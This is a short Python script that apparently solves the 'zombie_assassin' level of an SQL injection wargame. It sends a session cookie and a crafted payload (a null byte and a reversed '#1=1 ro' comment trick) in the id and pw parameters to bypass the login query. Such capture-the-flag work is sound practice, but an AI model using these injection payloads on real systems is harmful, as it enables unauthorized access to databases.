import requests
from dotenv import load_dotenv
import os

load_dotenv()
#python 환경이 아니면 \을 이스케이프시켜줄 필요는 없다. 
url=os.environ.get('LOS_URL')+'chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php?id=%00&pw=%231=1%20ro'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "ZOMBIE_ASSASSIN Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)